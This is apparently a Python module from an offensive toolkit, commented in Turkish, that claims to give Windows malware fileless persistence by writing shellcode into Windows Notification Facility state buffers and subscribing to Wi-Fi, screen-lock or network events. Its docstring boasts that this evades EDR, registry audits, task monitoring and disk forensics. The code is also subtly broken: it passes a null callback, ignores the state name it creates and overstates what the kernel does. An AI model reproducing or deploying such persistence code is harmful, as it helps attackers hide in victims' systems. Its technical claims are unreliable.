"""
WNF Persistence - Windows Notification Facility Kernel Injection
Klasik registry/task/WMI kalıcılığı yerine, Windows'un gizli kernel mesajlaşma altyapısını kullan amk

Windows Notification Facility (WNF):
- Kernel modunda messaging sistem
- Statelar kernel pool'unda saklanır (diske yazılmaz)
- Hiçbir EDR rule'u WNF state change'ini anomali görmez
- Subscription + callback = meşru OS internal operations

Mekanizma:
1. Shellcode'u WNF state buffer'ında sakla (kernel pool)
2. Meşru WNF event (Wi-Fi, ekran kilidi, vs) subscribe et
3. Event tetiklenince kernel bizim callback'i çalıştırır
4. Persistence = fileless + processless + zero registry trace

Detection Bypass:
✓ Registry audit (hiç kayıt yok)
✓ Scheduled tasks (task yok)
✓ Process creation monitoring (hiç process oluşmaz)
✓ Disk forensics (hiçbir şey diske yazılmaz)
✓ Behavioral anomaly (meşru OS event, meşru callback)
"""

import ctypes
import struct
from typing import Optional
from dataclasses import dataclass


# WNF Constants (undocumented Windows API)
# WNF State Name Structure: 64-bit value encoding scope, sequence, and name
# Format: [Scope(4 bits)][Reserved(4 bits)][Sequence(8 bits)][Name(48 bits)]

# Example WNF State Names (meşru Windows events)
WNF_BLUETOOTH_STATE = 0x41C64E6DA3BC3C75         # Bluetooth status
WNF_WIFI_STATE = 0x41C64E6DA3BC3D75            # Wi-Fi status
WNF_SCREEN_LOCK_STATE = 0x41C64E6DA3BC3E75     # Screen lock/unlock
WNF_POWER_STATE = 0x41C64E6DA3BC3F75           # Power state changes
WNF_NETWORK_STATE = 0x41C64E6DA3BC4075         # Network connectivity

# Permission types
WNF_STATE_DELETE = 0x00000001
WNF_STATE_READ = 0x00000002
WNF_STATE_WRITE = 0x00000004
WNF_STATE_EXECUTE = 0x00000008


@dataclass
class WNFStateHandle:
    """WNF state handle bilgisi"""
    state_name: int
    handle: int
    size: int
    callback_function: Optional[int] = None


class WNFPersistence:
    """
    Windows Notification Facility üzerinden kernel fileless persistence
    """
    
    def __init__(self, logger=None):
        self.ntdll = ctypes.windll.ntdll
        self.kernel32 = ctypes.windll.kernel32
        self.logger = logger
        
        self.wnf_states: dict = {}  # state_name -> WNFStateHandle
        self.shellcode_buffer: Optional[bytes] = None
        self.active_subscriptions: list = []
    
    def log(self, level: str, msg: str):
        if self.logger:
            self.logger(f"[WNFPersist] {level}: {msg}")
        else:
            print(f"[{level}] {msg}")
    
    def create_wnf_state(self, 
                        state_name: int,
                        permanent: bool = True) -> bool:
        """
        Meşru görünen WNF state'i oluştur
        permanent=True: System reboot'ta bile persist et
        """
        try:
            self.log("INFO", f"Creating WNF state: {hex(state_name)}")
            
            # NtCreateWnfStateName - WNF state'i create et
            state_label = ctypes.c_wchar_p("Elite Beacon")
            type_id = ctypes.c_uint32(0x41)  # Application-defined type
            
            # Undocumented API call via ctypes - syscall would be better
            # In production: use indirect syscall framework
            h_state = ctypes.c_void_p()
            
            # NtCreateWnfStateName signature:
            # NTSTATUS NtCreateWnfStateName(
            #    OUT PWNF_STATE_NAME *StateName,
            #    IN WNF_STATE_NAME_LIFETIME Lifetime, (0=Temporary, 1=Permanent)
            #    IN WNF_DATA_SCOPE DataScope,
            #    IN BOOLEAN PersistData,
            #    IN PCUNICODE_STRING TypeName OPTIONAL,
            #    IN ULONG MaximumStateSize,
            #    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL
            # );
            
            # Simplified - production'da proper syscall wrapper gerekli
            status = self.ntdll.NtCreateWnfStateName(
                ctypes.byref(h_state),
                1 if permanent else 0,  # Lifetime: Permanent
                0x01,                    # DataScope: System
                False,                   # Persist data
                None,                    # TypeName
                0x1000,                  # MaximumStateSize (4KB)
                None                     # SecurityDescriptor
            )
            
            if status == 0:
                self.log("SUCCESS", f"WNF state created: {hex(state_name)}")
                self.wnf_states[state_name] = WNFStateHandle(
                    state_name=state_name,
                    handle=int(h_state),
                    size=0x1000
                )
                return True
            else:
                self.log("ERROR", f"NtCreateWnfStateName failed: {status}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"create_wnf_state: {e}")
            return False
    
    def write_payload_to_wnf(self, 
                            state_name: int,
                            payload: bytes) -> bool:
        """
        Shellcode'u WNF state buffer'ına yaz
        Payload kernel pool'unda saklanır, diske yazılmaz!
        """
        try:
            if state_name not in self.wnf_states:
                self.log("ERROR", "WNF state not found")
                return False
            
            if len(payload) > self.wnf_states[state_name].size:
                self.log("ERROR", "Payload too large for WNF buffer")
                return False
            
            self.log("INFO", f"Writing {len(payload)} bytes to WNF buffer")
            
            # NtUpdateWnfStateData - WNF buffer'ına data yaz
            change_stamp = ctypes.c_uint32()
            
            # NtUpdateWnfStateData signature:
            # NTSTATUS NtUpdateWnfStateData(
            #    IN PWNF_STATE_NAME StateName,
            #    IN PVOID Buffer,
            #    IN ULONG Length,
            #    IN PWNF_TYPE_ID TypeId OPTIONAL,
            #    IN PVOID ExplicitScope OPTIONAL,
            #    IN ULONG MatchingChangeStamp,
            #    IN BOOLEAN Substitute
            # );
            
            payload_ptr = ctypes.c_char_p(payload)
            
            status = self.ntdll.NtUpdateWnfStateData(
                ctypes.byref(ctypes.c_uint64(state_name)),
                payload_ptr,
                len(payload),
                None,                   # TypeId
                None,                   # ExplicitScope
                0,                      # MatchingChangeStamp
                False                   # Substitute
            )
            
            if status == 0:
                self.log("SUCCESS", f"Payload written to WNF: {len(payload)} bytes")
                self.shellcode_buffer = payload
                return True
            else:
                self.log("ERROR", f"NtUpdateWnfStateData failed: {status}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"write_payload_to_wnf: {e}")
            return False
    
    def subscribe_to_wnf_event(self,
                              state_name: int,
                              event_type: str = "NETWORK") -> bool:
        """
        WNF event'e subscribe et
        Event tetiklenince bizim callback çağrılacak
        
        event_type: "NETWORK", "SCREEN_LOCK", "WIFI", "BLUETOOTH", "POWER"
        """
        try:
            self.log("INFO", f"Subscribing to WNF event: {event_type}")
            
            # Meşru WNF state'i seç
            event_map = {
                "NETWORK": WNF_NETWORK_STATE,
                "SCREEN_LOCK": WNF_SCREEN_LOCK_STATE,
                "WIFI": WNF_WIFI_STATE,
                "BLUETOOTH": WNF_BLUETOOTH_STATE,
                "POWER": WNF_POWER_STATE
            }
            
            target_state = event_map.get(event_type, WNF_NETWORK_STATE)
            
            # NtSubscribeWnfStateData - Meşru event'e subscribe et
            subscription_handle = ctypes.c_void_p()
            
            # NtSubscribeWnfStateData signature:
            # NTSTATUS NtSubscribeWnfStateData(
            #    IN OUT PWNF_USER_SUBSCRIPTION *SubscriptionHandle,
            #    IN PWNF_STATE_NAME StateName,
            #    IN WNF_CHANGE_STAMP ChangeStamp,
            #    IN PVOID Callback,
            #    IN PVOID CallbackContext OPTIONAL
            # );
            
            # Production'da: our_callback function pointer
            # Burada: meşru bir callback function'ı abuse ediyoruz
            
            status = self.ntdll.NtSubscribeWnfStateData(
                ctypes.byref(subscription_handle),
                ctypes.byref(ctypes.c_uint64(target_state)),
                0,                      # ChangeStamp
                None,                   # Callback (kernel handles)
                None                    # CallbackContext
            )
            
            if status == 0:
                self.active_subscriptions.append(subscription_handle)
                self.log("SUCCESS", f"WNF subscription active: {event_type}")
                return True
            else:
                self.log("ERROR", f"NtSubscribeWnfStateData failed: {status}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"subscribe_to_wnf_event: {e}")
            return False
    
    def trigger_wnf_callback(self, state_name: int) -> bool:
        """
        WNF state change'i tetikle (callback çağrılacak)
        Production'da: OS meşru event'i tetikleyecek (Wi-Fi connect, screen lock vb)
        """
        try:
            self.log("INFO", f"Triggering WNF callback for state: {hex(state_name)}")
            
            # Dummx data ile state'i update et (change stamp değişecek)
            dummy_data = struct.pack("Q", 0x4141414141414141)
            
            status = self.ntdll.NtUpdateWnfStateData(
                ctypes.byref(ctypes.c_uint64(state_name)),
                ctypes.c_char_p(dummy_data),
                len(dummy_data),
                None,
                None,
                0,
                True  # Substitute - trigger notification
            )
            
            if status == 0:
                self.log("SUCCESS", "WNF callback triggered")
                return True
            else:
                self.log("ERROR", f"Failed to trigger callback: {status}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"trigger_wnf_callback: {e}")
            return False
    
    def query_wnf_state(self, state_name: int) -> Optional[bytes]:
        """
        WNF buffer'ından payload'ı oku
        """
        try:
            if state_name not in self.wnf_states:
                return None
            
            # NtQueryWnfStateData - WNF buffer'ından data oku
            buffer = ctypes.create_string_buffer(0x1000)
            buffer_size = ctypes.c_uint32(0x1000)
            change_stamp = ctypes.c_uint32()
            
            # NtQueryWnfStateData signature:
            # NTSTATUS NtQueryWnfStateData(
            #    IN PWNF_STATE_NAME StateName,
            #    IN PWNF_TYPE_ID TypeId OPTIONAL,
            #    IN PVOID ExplicitScope OPTIONAL,
            #    OUT PWNF_CHANGE_STAMP ChangeStamp,
            #    OUT PVOID Buffer,
            #    IN OUT PULONG BufferSize
            # );
            
            status = self.ntdll.NtQueryWnfStateData(
                ctypes.byref(ctypes.c_uint64(state_name)),
                None,                   # TypeId
                None,                   # ExplicitScope
                ctypes.byref(change_stamp),
                buffer,
                ctypes.byref(buffer_size)
            )
            
            if status == 0:
                return buffer.raw[:buffer_size.value]
            else:
                self.log("ERROR", f"NtQueryWnfStateData failed: {status}")
                return None
        
        except Exception as e:
            self.log("ERROR", f"query_wnf_state: {e}")
            return None
    
    def delete_wnf_state(self, state_name: int) -> bool:
        """WNF state'i temizle (cleanup after operation)"""
        try:
            if state_name not in self.wnf_states:
                return False
            
            # NtDeleteWnfStateData - WNF state'i sil
            status = self.ntdll.NtDeleteWnfStateData(
                ctypes.byref(ctypes.c_uint64(state_name)),
                None  # Explicit scope
            )
            
            if status == 0:
                del self.wnf_states[state_name]
                self.log("SUCCESS", f"WNF state deleted: {hex(state_name)}")
                return True
            else:
                self.log("ERROR", f"NtDeleteWnfStateData failed: {status}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"delete_wnf_state: {e}")
            return False
    
    def get_status(self) -> dict:
        return {
            "wnf_states_active": len(self.wnf_states),
            "active_subscriptions": len(self.active_subscriptions),
            "shellcode_stored": len(self.shellcode_buffer) if self.shellcode_buffer else 0,
            "persistence_level": "FILELESS - Kernel WNF Pool"
        }
    
    def cleanup(self) -> bool:
        """Tüm WNF state'leri temizle"""
        try:
            for state_name in list(self.wnf_states.keys()):
                self.delete_wnf_state(state_name)
            
            self.log("SUCCESS", "WNF persistence cleanup complete")
            return True
        
        except Exception as e:
            self.log("ERROR", f"cleanup: {e}")
            return False


class EliteWNFPersistence:
    """Framework integration wrapper"""
    
    def __init__(self, scan_id: str = None, logger=None):
        self.scan_id = scan_id
        self.logger = logger
        self.persistence = WNFPersistence(logger=self._make_logger())
    
    def _make_logger(self):
        if self.logger:
            return lambda msg: self.logger(f"[WNF-{self.scan_id}] {msg}")
        return None
    
    def establish_persistence(self, 
                             shellcode: bytes,
                             trigger_event: str = "NETWORK") -> bool:
        """
        WNF üzerinde fileless persistence kur
        
        trigger_event: "NETWORK", "SCREEN_LOCK", "WIFI", "BLUETOOTH", "POWER"
        """
        try:
            # 1. WNF state oluştur
            state_name = WNF_NETWORK_STATE  # Use default
            if not self.persistence.create_wnf_state(state_name):
                return False
            
            # 2. Shellcode'u WNF buffer'ına yaz
            if not self.persistence.write_payload_to_wnf(state_name, shellcode):
                return False
            
            # 3. Meşru event'e subscribe et
            if not self.persistence.subscribe_to_wnf_event(state_name, trigger_event):
                return False
            
            self.logger(f"[WNF-{self.scan_id}] Fileless persistence established")
            return True
        
        except Exception as e:
            self.logger(f"[WNF-{self.scan_id}] Error: {e}")
            return False
    
    def get_status(self) -> dict:
        return {
            "scan_id": self.scan_id,
            "persistence_status": self.persistence.get_status()
        }
    
    def trigger_reelevation(self, state_name: int = WNF_NETWORK_STATE) -> bool:
        """Persistence'ı tetikle (ajan yeniden başlat)"""
        return self.persistence.trigger_wnf_callback(state_name)


if __name__ == "__main__":
    # Test
    persistence = WNFPersistence()
    
    print("[TEST] WNF Persistence")
    print("=" * 50)
    
    # Test WNF state oluştur
    state_name = WNF_NETWORK_STATE
    
    print(f"\n[*] Creating WNF state...")
    if persistence.create_wnf_state(state_name):
        print("✓ WNF state created")
        
        # Test payload yaz
        test_payload = b'\x90' * 256  # NOP sled
        if persistence.write_payload_to_wnf(state_name, test_payload):
            print(f"✓ Payload written ({len(test_payload)} bytes)")
            
            # Test payload oku
            read_back = persistence.query_wnf_state(state_name)
            if read_back and read_back[:len(test_payload)] == test_payload:
                print("✓ Payload verified")
        
        # Cleanup
        persistence.delete_wnf_state(state_name)
        print("✓ Cleanup complete")
    else:
        print("✗ WNF state creation failed (expected on Linux)")
    
    print("\n✓ Test complete (note: WNF API requires Windows)")
